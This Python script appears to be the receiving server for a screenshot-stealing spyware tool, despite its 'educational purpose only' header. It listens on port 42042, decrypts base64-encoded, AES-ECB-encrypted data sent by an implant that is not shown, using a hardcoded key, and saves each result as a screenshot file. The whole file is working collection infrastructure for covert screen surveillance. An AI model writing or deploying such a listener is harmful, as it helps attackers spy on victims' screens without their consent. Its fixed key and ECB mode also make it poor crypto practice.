#!/usr/bin/env python3
# -!- encoding:utf8 -!-
#
# WARNING: This program has been developped for EDUCATIONAL PURPOSE ONLY. You
#          engage your responsability if you use it in any other situation.
#
from struct import unpack
from signal import signal, SIGINT, SIGTERM
from socket import socket, AF_INET, SOCK_STREAM
from base64 import b64decode
from pathlib import Path
from Crypto.Cipher import AES
# =============================================================================
#  CONFIGURATION
# =============================================================================
AES_KEY = 'd3Adb3Efc4Feb4Be'
# =============================================================================
#  FUNCTIONS
# =============================================================================
def interrupt_hdlr(*args):
    exit(1)

def decrypt(data):
    cipher = AES.new(AES_KEY, AES.MODE_ECB)
    return cipher.decrypt(data)

def recv_data(sock):
    data = b''

    dsize = sock.recv(4)
    print("> receiving size bytes: {}".format(dsize))

    total_size = unpack('>I', dsize)[0]
    print("> waiting for {} bytes...".format(total_size))

    remaining = total_size
    while remaining > 0:
        chunk = sock.recv(remaining)
        if not chunk:
            raise ValueError("empty buffer received.")

        data += chunk
        remaining -= len(chunk)
        print(">> {} of {} bytes received.".format(len(data), total_size))

    return data

def main():
    srv_sock = socket(AF_INET, SOCK_STREAM)
    srv_sock.bind(('', 42042))
    srv_sock.listen(1)
    client_sock, client_addr = srv_sock.accept()

    while True:
        data = recv_data(client_sock)
        cleartext = decrypt(b64decode(data[4:-4]))
        Path('/tmp/screenshot.png').write_bytes(cleartext)
# =============================================================================
#  SCRIPT
# =============================================================================
if __name__ == '__main__':
    signal(SIGINT, interrupt_hdlr)
    signal(SIGTERM, interrupt_hdlr)
    main()
    exit(0)
